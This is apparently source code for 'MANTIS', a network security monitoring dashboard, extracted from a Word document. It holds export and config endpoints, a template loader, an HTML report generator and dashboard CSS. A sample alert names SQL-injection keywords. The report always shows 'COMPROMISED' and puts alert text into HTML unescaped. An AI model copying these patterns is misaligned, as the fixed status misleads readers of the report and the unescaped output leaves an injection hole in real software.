    <w:p w14:paraId="373AC5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"buffered": packet_store.STORE.stats_snapshot()["buffered"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64CA35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"total": packet_store.STORE.stats_snapshot()["total_seen"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7EF0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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEA02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797F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path == '/api/export':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18214C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download the whole in-memory capture as a JSON "pcap-lite" file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50725A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 = json.dumps({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFDB9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"exported_at": time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B2B8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"packets": packet_store.STORE.all_packets(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784E2E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}, indent=2).encode('utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A491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self.send_response(200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115076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self.send_header('Content-type', 'application/json')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D94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self.send_header('Content-Disposition',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D4AE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'attachment; filename="mantis_capture.json"')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3717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self.end_headers()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9703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self.wfile.write(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7CB47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2512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path == '/api/export.pcap':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F51F1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Serialise the in-memory ring buffer as a real libpcap file, so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B4D6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the captured frames can be verified independently in Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259C88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or tcpdump rather than only through this dashboard.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013EFE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records = packet_store.STORE.all_packets()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AC3E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 = pcap.build_from_records(records)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F32E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self.send_response(200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364F71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self.send_header('Content-type', 'application/vnd.tcpdump.pcap')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D0BD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self.send_header('Content-Disposition',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030F0F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'attachment; filename="mantis_capture.pcap"')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D2C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self.send_header('Content-Length', str(len(data)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="796E99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self.end_headers()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F23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self.wfile.write(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4190E8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2FA1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path == '/api/config':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="115020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expose the effective runtime policy so the operator can confirm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A004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whether active defence and privacy controls are actually on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07CDA8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self._send_json({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77CDE9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"block_enabled": CONFIG.block_enabled,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317C9F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"block_on": CONFIG.block_on,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150B00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"privacy_mode": CONFIG.privacy_mode,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622A41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"anonymise_ips": CONFIG.anonymise_ips,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A240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"payload_excerpt_bytes": CONFIG.payload_excerpt_bytes,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BB01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"zscore_threshold": CONFIG.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B332C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"zscore_window": CONFIG.zscore_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7549E1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"ddos_min_pps": CONFIG.ddos_min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E60AE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"ddos_consecutive_intervals":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E25AB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CONFIG.ddos_consecutive_intervals,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="163213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"packet_buffer": CONFIG.packet_buffer,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A208E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"pcap_file": CONFIG.pcap_file,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E1208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"blacklist_file": CONFIG.blacklist_file,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E327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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5964518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97AA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6D7920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self.send_error(404)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ADA018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791E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_get_dashboard_html(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59908C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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197807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1. Get the path to this script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB603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script_path = os.path.abspath(__file__)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA3052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0935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2. If it's a symlink (e.g. /usr/bin/mantis-siem), follow it to the real file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46549B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os.path.islink(script_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D4C6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script_path = os.readlink(script_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD418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C756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3. Get the directory containing the real siem.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="244B35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base_dir = os.path.dirname(script_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745793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C56B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4. Construct the path to the HTML template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56ACC8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template_path = os.path.join(base_dir, 'web_template.html')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D81AC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C27D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A4995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open(template_path, 'r', encoding='utf-8') as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F800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f.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C2B81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FileNotFoundError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C07C2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f"&lt;html&gt;&lt;body&gt;&lt;h1&gt;Error: web_template.html not found at {template_path}&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C97E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FB66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start_siem():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238B01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1. Start UDP Listener in Background Thread</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C52D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udp_server = SyslogUDPHandler(UDP_PORT)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756A4C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udp_thread = threading.Thread(target=udp_server.start, daemon=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A145C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udp_thread.start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3B26F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535A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2. Start Web Server in Main Thread</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD043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Starting MANTIS SIEM Web Dashboard on http://localhost:{HTTP_PORT}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AF8A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print(f"[*] Press Ctrl+C to stop.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136B6F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A9E2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Custom TCP Server that allows immediate port reuse (fixes 'Address already in use')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7551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class ReusableTCPServer(socketserver.TCPServer):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BE12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allow_reuse_address = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E341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5574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httpd = ReusableTCPServer(("", HTTP_PORT), WebDashboardHandler)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5E06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483D79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httpd.serve_forever()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795B0E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KeyboardInterrupt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3549C4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print("\n[!] Stopping Web Server.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FB0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httpd.server_close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9C883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23C4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1543F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start_siem()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C254C73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src/dashboard_ui/reporting.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF2DA4D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(86 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18ADA6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58C602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3F55F5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B5BE5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5455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ReportGenerator:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705DB1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collects alerts during a run and writes a single html file at exit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55780D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B74F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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0864CD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self.filename = "mantis_report.html"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E223B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 = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="225773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E762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add_alert(self, msg):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB96E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self.alerts.append({"time": time.strftime("%H:%M:%S"), "message": msg})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76BE297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4922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generate(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AE2D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self.alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D03B5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 # nothing happened, skip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52485F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78E1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rows = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616DBB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a in self.alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49CED0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msg = a["message"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E183C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kind, css = "UNKNOWN", ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C4DB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"DDoS" in msg:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="751BEA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kind, css = "DDoS Attack", "tag-ddos"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0EC8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"SCAN" in msg:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11338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kind, css = "Port Scan", "tag-scan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01666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"PAYLOAD" in msg:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5111F6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kind, css = "Web Attack", "tag-web"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393B47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"BLACKLIST" in msg:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324531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kind, css = "Blacklist Hit", "tag-malware"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238D2E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rows.append(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A313B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"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;&lt;span class='tag %s'&gt;%s&lt;/span&gt;&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC599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% (a["time"], css, kind, msg)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309761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)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A921FE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DF62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html = """&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE1D3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&lt;html&gt;&lt;head&gt;&lt;title&gt;MANTIS Threat Report&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588C9B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&lt;style&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254378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body{font-family:'Segoe UI',sans-serif;background:#1a1a1a;color:#f0f0f0;margin:0;padding:20px}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286EAD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h1{color:#00ff9d;border-bottom:2px solid #00ff9d;padding-bottom:10px}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F3CC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.card{background:#2d2d2d;border-radius:8px;padding:20px;margin-bottom:20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFF3F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box-shadow:0 4px 6px rgba(0,0,0,0.3)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3F24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table{width:100%;border-collapse:collapse;margin-top:10px}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33723A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th,td{padding:12px;text-align:left;border-bottom:1px solid #404040}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404510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th{background:#333;color:#00ff9d}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348C3C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tr:hover{background:#383838}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EDE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.tag{padding:4px 8px;border-radius:4px;font-size:12px;font-weight:bold}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B375B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.tag-ddos{background:#ff4444;color:#fff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C397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.tag-scan{background:#ffbb33;color:#000}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B856F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.tag-web{background:#33b5e5;color:#fff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191B6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.tag-malware{background:#aa66cc;color:#fff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BEDDF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.summary-box{display:flex;gap:20px}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB715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.metric{background:#333;padding:15px;border-radius:5px;flex:1;text-align:center}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC09D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.metric h3{margin:0;color:#888;font-size:14px}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51671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.metric p{margin:5px 0 0;font-size:24px;font-weight:bold;color:#fff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9542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&lt;/style&gt;&lt;/head&gt;&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B1E6C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&lt;h1&gt;M.A.N.T.I.S. Forensic Report&lt;/h1&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6927F3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&lt;div class="card"&gt;&lt;h2&gt;Session Summary&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBD0A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&lt;div class="summary-box"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4B56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&lt;div class="metric"&gt;&lt;h3&gt;Generated At&lt;/h3&gt;&lt;p&gt;__GENERATED_AT__&lt;/p&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543441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&lt;div class="metric"&gt;&lt;h3&gt;Total Alerts&lt;/h3&gt;&lt;p&gt;__ALERT_COUNT__&lt;/p&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B05C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&lt;div class="metric"&gt;&lt;h3&gt;System Status&lt;/h3&gt;&lt;p style="color:#ff4444"&gt;COMPROMISED&lt;/p&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD4A1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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4DF2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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685667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&lt;div class="card"&gt;&lt;h2&gt;Incident Log&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CC3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&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Time&lt;/th&gt;&lt;th&gt;Threat Type&lt;/th&gt;&lt;th&gt;Details&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="155E10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&lt;tbody&gt;__ALERT_ROWS__&lt;/tbody&gt;&lt;/table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549FEA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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1601E9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&lt;div class="card"&gt;&lt;p&gt;Generated by M.A.N.T.I.S.&lt;/p&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626A2B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&lt;/body&gt;&lt;/html&gt;"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2226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html = (html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1EE1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.replace("__GENERATED_AT__", time.ctime())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBA76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.replace("__ALERT_COUNT__", str(len(self.alerts)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525842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.replace("__ALERT_ROWS__", "".join(rows)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF4935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C429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open(self.filename, "w") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B881B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f.write(html)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8541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print("\n[*] report written to", os.path.abspath(self.filename))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562C42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1229C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D91F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5EA75A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 = ReportGenerator()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554D0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r.add_alert("DDoS DETECTED! Z-Score: 5.2")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08626F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r.add_alert("PORT SCAN DETECTED! (Unique Ports: 44/sec)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435F3C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r.add_alert("MALICIOUS PAYLOAD! Keywords: ['UNION', 'SELECT']")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378EF2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r.generate()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02035C3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src/dashboard_ui/web_template.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F445E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(1946 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172A65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&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508C1F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&lt;html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA80A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ADD4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&lt;head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CE78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&lt;meta charset="utf-8"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F6FE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7394F7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&lt;meta name="description" content="MANTIS network security monitoring dashboard"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DB92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&lt;title&gt;MANTIS | Security Operations&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6698BC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&lt;style&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C84F0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@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=JetBrains+Mono:wght@400;500&amp;display=swap');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631371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F141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:root {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717DB0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--bg-main: #0e0f15;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE7ED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--bg-nav: #161821;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459E3F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--bg-card: #1c1f2e;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62ECC0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--bg-card-hover: #232738;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB246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--text-main: #f0f2f5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65352C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--text-muted: #919bb0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43FF89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--accent-green: #0cd15b;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D56ED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--accent-blue: #3b82f6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEC66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--accent-red: #ef4444;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A13BF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--accent-orange: #f59e0b;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129887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--accent-purple: #8b5cf6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008C13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--border-color: #2a2e3f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E656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785C5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EB70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body {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0036E3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'Inter', sans-serif;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D15F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var(--bg-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F4F11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175240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497DF9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00D3B9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100vh;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5573D8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hidden;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583729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73587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8B47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Sidebar Navigation --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="693D4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.sidebar {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCE41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260px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBF5F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var(--bg-nav);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D06D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border-right: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1135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5E46FB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flex-direction: column;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643ADD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z-index: 100;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4148D4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1F9D59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8421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.logo-container {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF2F5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24px 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C912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5AD761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13C979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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3340D1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58A86B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030F2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E272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.logo-container h1 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4A1E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587AF7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18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0076C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67E580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0.5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A78D5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8AA5E3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EDFE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.logo-subtitle {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1747C6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379595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var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009DD9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42BCA0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596EA9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1px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055961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105C60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8BB9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.nav-menu {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4A5A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20px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B7C7C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flex: 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41AE6C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B87923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0275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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2852FD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14px 24px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CF15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2D854A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6D8A93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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78528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10CC5F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cursor: pointer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B86DB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4F9926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font-size: 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="415CF4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transition: all 0.2s;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2620E7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border-left: 3px solid transparent;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5760E9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BEF058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B2D4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.nav-item:hover {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769678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rgba(255, 255, 255, 0.03);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0591C7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44B105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63876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2F44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.nav-item.active {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6359B8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rgba(59, 130, 246, 0.1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0402D0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var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0C77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border-left-color: var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="285456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69423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14D5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Main Content Area --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065FA1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.main-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBA82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flex: 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171CD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48FB65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flex-direction: column;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F849A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hidden;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D287A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4E670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7D29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header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A5B5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var(--bg-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2564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16px 30px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347A6B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577DF8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16A81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space-between;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A373F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449A74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46BA3F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7DB1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.status-badge {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510FE1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695489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6B3BF0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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757DFA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'JetBrains Mono', monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF78D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3FF761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rgba(12, 209, 91, 0.1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105262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var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A9CA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6px 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CE72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4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FC28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rgba(12, 209, 91, 0.2);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A908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CBC4F6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3EB6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.pulse-dot {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F799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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC9E6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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088B4C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background-color: var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6312EF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50%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="687BAF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animation: pulse 2s infinite;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C157B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F30111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0CFB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@keyframes pulse {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071624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0% {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777285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box-shadow: 0 0 0 0 rgba(12, 209, 91, 0.7);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6929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007C85F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2CDB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70% {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EDBE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box-shadow: 0 0 0 6px rgba(12, 209, 91, 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A79E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277D14A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8E0A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100% {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58416D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box-shadow: 0 0 0 0 rgba(12, 209, 91, 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610950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3D600C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8CFDB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1B94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Tab Content containers --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421AC3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.tab-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17DC99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none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F785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24px 30px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CA61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overflow-y: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFB69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flex: 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F9EC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5EBBC0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9992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.tab-content.active {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719985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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299B71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B5955B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39AE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Dashboard Grid --- */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E6B7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.metrics-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7609C4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display: grid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC8B9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grid-template-columns: repeat(4, 1fr);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02736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20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="207DE3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24px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18980F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CA5F9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5866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.card {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2872F3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5CF7A3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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23568E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20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AB16B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136863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position: relative;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B93A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AF8FA0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9CD5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.card-header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17AA27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75BE81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2887B3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78F952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0FDAFB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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EFAE5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5A3AAD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space-between;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1824F0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C1FE37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6722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.metric-value {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65951F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28px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D933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3B8DF4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4FD8B6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7E59C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C267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.top-acc-blue {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130D2C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border-top: 3px solid var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B6595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32A8A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1997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.top-acc-green {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC3D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border-top: 3px solid var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46682C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58180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323E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.top-acc-red {</w:t>
      </w:r>
    </w:p>
